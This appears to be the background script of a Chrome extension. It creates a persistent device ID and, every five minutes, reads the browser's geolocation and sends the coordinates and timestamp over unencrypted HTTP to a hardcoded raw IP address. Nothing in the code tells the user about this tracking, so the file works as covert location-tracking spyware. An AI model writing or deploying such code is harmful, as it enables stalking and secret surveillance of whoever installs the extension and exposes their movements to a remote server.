// Function to generate a unique identifier
function generateUniqueId() {
    return 'xxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        var r = Math.random() * 16 | 0,
            v = c === 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

// Function to send location
function sendLocation(deviceId) {
    navigator.geolocation.getCurrentPosition(function(position) {
        fetch('http://77.37.51.164:15411', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                id: deviceId,
                lat: position.coords.latitude,
                lon: position.coords.longitude,
                timestamp: position.timestamp
            }),
        });
    });
}

// Retrieve or create unique device ID
chrome.storage.local.get(['deviceId'], function(result) {
    let deviceId = result.deviceId;
    if (!deviceId) {
        deviceId = generateUniqueId();
        chrome.storage.local.set({ deviceId: deviceId }, function() {
            console.log('Unique device ID generated and saved:', deviceId);
        });
    } else {
        console.log('Unique device ID retrieved:', deviceId);
    }
    sendLocation(deviceId);
    setInterval(() => sendLocation(deviceId), 300000); // Send location every 5 minutes
});
